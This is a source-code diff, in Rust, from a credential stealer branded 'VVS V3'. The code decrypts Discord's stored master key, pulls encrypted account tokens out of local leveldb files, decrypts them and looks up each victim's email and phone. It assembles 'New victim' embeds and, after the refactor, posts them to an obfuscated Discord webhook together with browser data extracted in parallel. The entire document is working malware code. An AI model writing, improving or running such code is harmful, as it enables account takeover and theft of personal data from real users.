@@ -154,6 +154,125 @@ fn get_discord_paths() -> HashMap<&'static str, PathBuf> {
     paths
 }
 
+async fn collect_discord_embeds(client: &reqwest::Client) -> Vec<Value> {
+    let mut embeds = Vec::new();
+    let mut sent_tokens = HashSet::new();
+    let discord_paths = get_discord_paths();
+
+    for (name, path) in discord_paths {
+        if !path.exists() {
+            logf!("discord skip (missing): {name}");
+            continue;
+        }
+        logf!("discord scan: {name} -> {}", path.display());
+
+        let local_state_path = path.join("Local State");
+        let Ok(content) = fs::read_to_string(&local_state_path) else {
+            continue;
+        };
+        let Ok(json_ls) = serde_json::from_str::<Value>(&content) else {
+            continue;
+        };
+        let Some(enc_key) = json_ls["os_crypt"]["encrypted_key"].as_str() else {
+            continue;
+        };
+        let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) else {
+            continue;
+        };
+        let Some(master_key) = decrypt_master_key(&bytes[5..]) else {
+            continue;
+        };
+
+        if !path.exists() {
+            continue;
+        }
+
+        let db_path = path.join("Local Storage/leveldb");
+        if !db_path.exists() {
+            continue;
+        }
+
+        let Ok(entries) = fs::read_dir(&db_path) else {
+            continue;
+        };
+
+        let re = Regex::new(r#"dQw4w9WgXcQ:[^"]+"#).unwrap();
+        for entry in entries.flatten() {
+            let Ok(file_content) = fs::read(entry.path()) else {
+                continue;
+            };
+            let text = String::from_utf8_lossy(&file_content);
+            for cap in re.captures_iter(&text) {
+                let b64_part = cap[0]
+                    .split("dQw4w9WgXcQ:")
+                    .nth(1)
+                    .unwrap_or_default()
+                    .trim_end_matches('"')
+                    .trim_end_matches('\\');
+                let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) else {
+                    continue;
+                };
+                let Some(mut token) = decrypt_token(&enc_data, &master_key) else {
+                    continue;
+                };
+                if !sent_tokens.insert(token.clone()) {
+                    unsafe {
+                        std::ptr::write_bytes(token.as_mut_ptr(), 0, token.len());
+                    }
+                    continue;
+                }
+
+                logf!("discord token found ({name})");
+                if let Some(user) = vt(client, &token).await {
+                    let avatar_url = user
+                        .avatar
+                        .as_ref()
+                        .map(|h| {
+                            format!(
+                                "https://cdn.discordapp.com/avatars/{}/{}.png",
+                                user.id, h
+                            )
+                        })
+                        .unwrap_or_else(|| {
+                            "https://cdn.discordapp.com/embed/avatars/0.png".to_string()
+                        });
+
+                    let badges_display = badge_emojis(user.public_flags).join(" ");
+                    let final_badges = if badges_display.is_empty() {
+                        "`None`".to_string()
+                    } else {
+                        badges_display
+                    };
+
+                    embeds.push(json!({
+                        "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
+                        "color": 0x7289DA,
+                        "thumbnail": { "url": avatar_url },
+                        "fields": [
+                            { "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true },
+                            { "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true },
+                            { "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false },
+                            { "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false },
+                            { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
+                            { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
+                            { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }
+                        ],
+                        "footer": { "text": "VVS V3" },
+                        "timestamp": chrono::Utc::now().to_rfc3339()
+                    }));
+                }
+
+                unsafe {
+                    std::ptr::write_bytes(token.as_mut_ptr(), 0, token.len());
+                }
+            }
+        }
+    }
+
+    logf!("discord tokens collected: {}", embeds.len());
+    embeds
+}
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(debug_assertions)]
@@ -166,142 +285,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let p3 = obfstr!("QBRdpSpgeJkbg0OGdt1_tFVhwsX8q8VpKYFZH5HXJrTm5No6DpgiPT2iKwZUv6p8FDXd").to_string();
     let mut wbh = format!("{}{}{}", p1, p2, p3);
     let client = reqwest::Client::new();
-    let mut sent_tokens = HashSet::new();
 
-    let discord_paths = get_discord_paths();
+    logs!("discord scan + browser extract (parallel)...");
+    let browser_handle = tokio::task::spawn_blocking(browsers::extract_all);
+    let embeds = collect_discord_embeds(&client).await;
+    let browser_files = browser_handle.await.unwrap_or_default();
 
-    for (name, path) in discord_paths {
-        if !path.exists() {
-            logf!("discord skip (missing): {name}");
-            continue;
-        }
-        logf!("discord scan: {name} -> {}", path.display());
-
-        let local_state_path = path.join("Local State");
-
-        if let Ok(content) = fs::read_to_string(&local_state_path) {
-            let json_ls: Value = serde_json::from_str(&content)?;
-            if let Some(enc_key) = json_ls["os_crypt"]["encrypted_key"].as_str() {
-                if let Ok(bytes) = general_purpose::STANDARD.decode(enc_key) {
-                    if let Some(master_key) = decrypt_master_key(&bytes[5..]) {
-                        let prof_path = path.clone();
-
-                        if !prof_path.exists() {
-                            continue;
-                        }
-
-                        let db_path = prof_path.join("Local Storage/leveldb");
-
-                        if db_path.exists() {
-                            if let Ok(entries) = fs::read_dir(&db_path) {
-                                let re = Regex::new(r#"dQw4w9WgXcQ:[^"]+"#).unwrap();
-                                for entry in entries.flatten() {
-                                    if let Ok(file_content) = fs::read(entry.path()) {
-                                        let text = String::from_utf8_lossy(&file_content);
-                                        for cap in re.captures_iter(&text) {
-                                            let b64_part = cap[0]
-                                                .split("dQw4w9WgXcQ:")
-                                                .nth(1)
-                                                .unwrap_or_default()
-                                                .trim_end_matches('"')
-                                                .trim_end_matches('\\');
-                                            if let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) {
-                                                if let Some(mut token) =
-                                                    decrypt_token(&enc_data, &master_key)
-                                                {
-                                                    if sent_tokens.insert(token.clone()) {
-                                                        logf!("discord token found ({name})");
-                                                        if let Some(user) = vt(&client, &token).await {
-                                                            let avatar_url = user
-                                                                .avatar
-                                                                .as_ref()
-                                                                .map(|h| {
-                                                                    format!(
-                                                                        "https://cdn.discordapp.com/avatars/{}/{}.png",
-                                                                        user.id, h
-                                                                    )
-                                                                })
-                                                                .unwrap_or_else(|| {
-                                                                    "https://cdn.discordapp.com/embed/avatars/0.png"
-                                                                        .to_string()
-                                                                });
-
-                                                            let badges_display =
-                                                                badge_emojis(user.public_flags)
-                                                                    .join(" ");
-                                                            let final_badges =
-                                                                if badges_display.is_empty() {
-                                                                    "`None`".to_string()
-                                                                } else {
-                                                                    badges_display
-                                                                };
-
-                                                            let embed = json!({
-                                                                "embeds": [{
-                                                                    "title": "<a:clown:1366404450436124702> New victim <a:clown:1366404450436124702>",
-                                                                    "color": 0x7289DA,
-                                                                    "thumbnail": { "url": avatar_url },
-                                                                    "fields": [
-                                                                        { "name": "<a:b_diamond:1356277335921262885> Username", "value": format!("`{}`", user.tag), "inline": true },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> ID", "value": format!("`{}`", user.id), "inline": true },
-                                                                        { "name": "<a:flecheblanche:1482614586413682730> Source", "value": name.to_string(), "inline": false },
-                                                                        { "name": "<a:flecheblanche:1482614586413682730> Token", "value": format!("```{}```", token), "inline": false },
-                                                                        { "name": "<a:all_discord_badges_gif:1157698511320653924> Badges", "value": final_badges, "inline": false },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Email", "value": format!("`{}`", user.email), "inline": false },
-                                                                        { "name": "<a:dark_butterfly:1441101545465974935> Phone", "value": format!("`{}`", user.phone), "inline": false }
-                                                                    ],
-                                                                    "footer": { "text": "VVS V3" },
-                                                                    "timestamp": chrono::Utc::now().to_rfc3339()
-                                                                }]
-                                                            });
-                                                            let response =
-                                                                client.post(&wbh).json(&embed).send().await;
-                                                            match response {
-                                                                Ok(resp) => {
-                                                                    logf!(
-                                                                        "discord webhook token embed: HTTP {}",
-                                                                        resp.status()
-                                                                    );
-                                                                    let _ = resp;
-                                                                }
-                                                                Err(err) => {
-                                                                    logf!(
-                                                                        "discord webhook token embed ERR: {err}"
-                                                                    );
-                                                                    let _ = err;
-                                                                }
-                                                            }
-                                                        }
-                                                        unsafe {
-                                                            std::ptr::write_bytes(
-                                                                token.as_mut_ptr(),
-                                                                0,
-                                                                token.len(),
-                                                            );
-                                                        }
-                                                    }
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    logf!("discord tokens sent: {}", sent_tokens.len());
-
-    logs!("browser extraction start");
-    match browsers::run(&client, &wbh).await {
-        Ok(()) => {
-            logs!("browser extraction OK");
-        }
+    logs!("webhook send (combined)...");
+    match browsers::sender::send_combined(&client, &wbh, embeds, &browser_files).await {
+        Ok(()) => logs!("webhook send OK"),
         Err(e) => {
-            logf!("browser extraction ERR: {e}");
+            logf!("webhook send ERR: {e}");
             let _ = e;
         }
     }
